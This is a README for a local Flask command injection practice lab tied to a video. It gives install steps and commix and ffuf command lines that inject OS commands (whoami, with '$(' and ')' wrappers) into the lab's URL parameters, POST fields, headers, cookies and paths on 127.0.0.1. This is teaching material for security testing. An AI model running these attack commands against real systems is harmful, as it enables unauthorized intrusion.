# Command Injection Lab
## Src
https://youtu.be/RlM6gO_GoHo

## Installation and Usage
It's a python-flask webapp:
```
pip3 install Flask

# Start the server, by default running on 127.0.0.1:5000
python3 CmdInjectionLab.py
```

## Commands used in the video
```
# Attacking GET url parameters
commix -u http://127.0.0.1:5000/storage?file=test -p file --batch --os-cmd=whoami --skip-heuristics --technique=t --ignore-session

# Attacking GET url parameters with suffix and prefix
commix -u http://127.0.0.1:5000/storage?file=test -p file --batch --os-cmd=whoami --skip-heuristics --ignore-session --technique=t --prefix='$(' --suffix=')'

# Attacking POSY body parameters 
commix -u http://127.0.0.1:5000/create_entry --batch --os-cmd=whoami --skip-heuristics --ignore-session --technique=t --prefix='$(' --suffix=')' --method POST --data="id=5&filename=test.txt" 

# Attacking POSY body parameters with multiple params
commix -u http://127.0.0.1:5000/create_entry --batch --os-cmd=whoami --skip-heuristics --ignore-session --method POST --technique=t --prefix='$(' --suffix=')' --data="cache=false&text=hello&form=login&source=prod&target=xpa&user=admin&output=json&range=10&temp=true&level=1&model=test&focus=0&label=txq&order=goe&limit=79n&retry=5&note=text&title=welcome&query=all&block=0&key=s3cret&mode2=kic&extra=wq1&ping=4&zone=0&id=1&filename=test"  

# Discovering endpoints and attacking Header values 
ffuf -u http://127.0.0.1:5000/FUZZ -w directories.txt:FUZZ -w headers.txt:HEADER -w payloads.txt:PAYLOAD -H 'HEADER: PAYLOAD' -ft '<2500' -c

# Discovering endpoints and attacking Cookie values 
ffuf -u http://127.0.0.1:5000/FUZZ -w directories.txt:FUZZ -w payloads.txt:PAYLOAD -H 'Cookie: SESSIONID=PAYLOAD' -ft '<2500' -c -X POST

# Discovering endpoints and attacking Path variables  
ffuf -u http://127.0.0.1:5000/FUZZ/PAYLOAD -w directories.txt:FUZZ -w payloads.txt:PAYLOAD -ft '<2000' -c
```
